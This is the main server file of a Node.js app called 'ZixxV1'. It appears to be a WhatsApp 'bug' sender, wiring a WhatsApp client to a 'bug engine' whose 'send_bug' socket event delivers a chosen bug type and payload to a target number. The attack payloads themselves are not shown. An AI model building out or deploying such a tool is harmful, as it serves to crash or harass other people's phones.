require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

// Import modules
const { initWhatsAppClient } = require('./whatsapp');
const { initDatabase } = require('./database');
const bugEngine = require('./bug-engine');

// Routes
const sendRoutes = require('./routes/send');
const pairingRoutes = require('./routes/pairing');
const logsRoutes = require('./routes/logs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '../frontend')));

// Global variables
global.whatsappClient = null;
global.isWhatsAppReady = false;
global.activeSessions = new Map();
global.socketConnections = new Map();

// Initialize
(async () => {
    console.log('🚀 Initializing ZixxV1 System...');
    
    // Init database
    await initDatabase();
    console.log('✅ Database initialized');
    
    // Init WhatsApp client
    try {
        global.whatsappClient = await initWhatsAppClient(io);
        global.isWhatsAppReady = true;
        console.log('✅ WhatsApp Client ready');
    } catch (error) {
        console.error('❌ WhatsApp initialization failed:', error);
    }
    
    // Init bug engine
    bugEngine.init(io);
    console.log('✅ Bug Engine ready');
})();

// Routes
app.use('/api/send', sendRoutes);
app.use('/api/pairing', pairingRoutes);
app.use('/api/logs', logsRoutes);

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// WebSocket connection
io.on('connection', (socket) => {
    console.log('🔌 New client connected:', socket.id);
    
    socket.on('register', (userId) => {
        global.socketConnections.set(userId, socket);
        console.log(`📱 User ${userId} registered`);
    });
    
    socket.on('send_bug', async (data) => {
        const { target, bugType, payload } = data;
        console.log(`🐛 Bug request: ${bugType} to ${target}`);
        
        // Process bug
        const result = await bugEngine.sendBug(target, bugType, payload, socket.id);
        socket.emit('bug_status', result);
    });
    
    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        // Cleanup
        for (let [key, value] of global.socketConnections.entries()) {
            if (value.id === socket.id) {
                global.socketConnections.delete(key);
                break;
            }
        }
    });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🔥 ZixxV1 Server running on port ${PORT}`);
    console.log(`🌐 Frontend: http://localhost:${PORT}`);
    console.log(`📱 WhatsApp Status: ${global.isWhatsAppReady ? 'READY' : 'NOT READY'}`);
});